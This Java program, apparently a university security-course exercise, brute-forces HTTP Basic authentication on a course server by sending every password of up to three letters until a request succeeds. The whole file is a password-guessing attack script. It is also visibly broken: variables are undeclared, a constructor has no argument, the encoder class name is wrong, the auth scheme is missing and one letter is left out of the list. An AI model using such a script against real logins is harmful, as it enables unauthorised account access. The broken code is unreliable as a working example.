
import java.io.*;
import java.net.*;

public class BruteForce
{

  public static void  main(String args[])
  {
    StringWriter sw = new StringWriter();
    PrintWriter  pw = new PrintWriter();
    int flag=1;
    String[] letter = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N",
                        "O","P","Q","R","T","U","V","W","X","Y","Z","a","b","c",
                        "d","e","f","g","h","i","j","k","l","m","n","o","p","q",
                        "r","s","t","u","v","w","x","y","z",""};

    String urlString = new String("http://sec-crack.cs.rmit.edu./SEC/2/");
    String thePassword= new String();
     stime = System.currentTimeMillis();
System.out.println("");
    for(int i=0; i<letter.length;i++)
    {
      for(int j=0; j<letter.length; j++)
      {
        for(int k=0;flag==1 && k<letter.length; k++)
        {
          try {
            URL url = new URL (urlString);
            thePassword=letter[i].trim()+letter[j].trim()+letter[k].trim();

            String userPassword = "" + ":" + thePassword;

            String encoding = new url.misc.BASE64Encoder().encode(userPassword.getBytes());
            URLConnection uc = url.openConnection();
            uc.setRequestProperty("Authorization", " " + encoding);
            InputStream content = (InputStream)uc.getContent();
             endtime = System.currentTimeMillis();
            BufferedReader in   =
                      new BufferedReader (new InputStreamReader (content));
            String line;
            while ((line = in.readLine()) != null) {
            pw.println (line);
            }
            flag=0;
            System.out.println("process time is : " +(endtime-stime)/1000 +" seconds.");
          }catch (MalformedURLException e) {

           flag=1;
          }catch (IOException e) {

           flag=1;
          }
        }
        if(flag==0)
          break;
        else
         System.out.println("letter j ->"+ letter[j]+" elapsed");
      }
      if(flag==0)
         break;
      else
         System.out.println("letter i ->"+ letter[i]+" elapsed");
    }
    System.out.println("content is "+ sw.toString());
   }
 }